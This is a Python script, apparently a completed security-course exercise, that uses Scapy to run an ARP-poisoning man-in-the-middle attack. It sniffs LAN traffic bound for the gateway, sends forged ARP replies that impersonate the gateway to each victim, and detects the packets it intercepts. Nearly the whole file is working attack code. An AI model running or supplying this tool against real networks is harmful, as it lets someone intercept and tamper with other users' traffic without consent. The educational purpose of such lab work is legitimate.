import scapy.all as S
from scapy.all import IP, TCP, Ether

class ArpPoisoner(object):
    def __init__(self, our_ip, our_mac, gateway_ip, gateway_mac, debug):
        # WARNING: DO NOT EDIT THIS FUNCTION!
        self.our_ip = our_ip
        self.our_mac = our_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.debug = debug

    def is_packet_to_original_gateway(self, packet) -> bool:
        """
        Filter packets to the gateway from OTHER computers (ignore packets
        we send - as we don't want to poison ourselves).

        Note: You may assume all packets have both IP and Ethernet layers.
        """
        
        if packet[Ether].dst == self.gateway_mac:
        # packets to the gateway (gateway_mac bcs it`s inside the path)
            if packet[IP].src != self.our_ip:
            # from OTHER computers (our_ip bcs it`s the end-point target, at the end of the path)
                return True
        
        return False
        

    def is_stolen_packet(self, packet) -> bool:
        """
        Check if this packet is stolen by our ARP poisoning (meaning this packet
        was not supposed to be sent to us, but it has our MAC address!)

        Note: You may assume all packets have both IP and Ethernet layers.
        """ 
        if packet[IP].dst != self.our_ip:
        # this packet was not supposed to be sent to us (ip bcs it`s the end-point target, at the end of the path)
            if packet[Ether].dst == self.our_mac:
            # it has our MAC address (mac bcs it`s inside the path)
                return True
        
        return False
        

    def packet_filter(self, packet):
        """
        We want to look at packets that are either stolen, or meant to the
        original gateway (meaning we should poison these).
        """
        # WARNING: DO NOT EDIT THIS FUNCTION!
        return packet.haslayer(S.IP) and packet.haslayer(S.Ether) and (False
                                                                       or self.is_packet_to_original_gateway(packet)
                                                                       or self.is_stolen_packet(packet)
                                                                       )

    def create_poison(self, victim_packet):
        """
        Create a packet to ARP poison the victim into talking with us as the
        gateway. You don't need to care about Ethernet layer - we will create
        that for you.

        Notes:
        1. The victim packet already passed `is_packet_to_original_gateway`.
        2. Don't poison everyone on the network - poison only this specific
           victim.
        """
        return S.ARP(op=2, pdst=victim_packet[IP].src, hwdst=victim_packet[Ether].src, psrc=self.gateway_ip, hwsrc=self.our_mac)
        
        # op = 2 means arp reply, credit: https://www.iana.org/assignments/arp-parameters/arp-parameters.xhtml
        # https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/

    def handle_packet(self, packet):
        """
        Identify which filter matches this packet, and send an ARP poison if
        the packet was sent to the original gateway.
        """
        # WARNING: DO NOT EDIT THIS FUNCTION!
        if self.debug:
            print('Handling packet:')
            print(repr(packet))

        if self.is_packet_to_original_gateway(packet):
            poison = self.create_poison(packet)
            if self.debug:
                print('Generated poison:')
                print(repr(poison))
            S.sendp(S.Ether() / poison)
            return 'Sent poison! '
        elif self.is_stolen_packet(packet):
            return 'Received a stolen packet! '


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args or len(args) != 5 and len(args) != 6:
        print(
            'Usage: %s <our_ip> <our_mac> <gateway_ip> <gateway_mac> [--debug]'
            % args[0]
        )
        print(
            'If the --debug flag is used, it will print packets for easier ' +
            'debugging')
        return

    our_ip, our_mac = args[1], args[2]
    gateway_ip, gateway_mac = args[3], args[4]
    debug = len(args) == 6 and args[5] == '--debug'

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    poisoner = ArpPoisoner(
        our_ip=args[1],
        our_mac=args[2],
        gateway_ip=args[3],
        gateway_mac=args[4],
        debug=debug,
    )

    # Now sniff and wait for injection opportunities.
    S.sniff(
        lfilter=poisoner.packet_filter,
        prn=poisoner.handle_packet
    )


if __name__ == '__main__':
    import sys
    main(sys.argv)
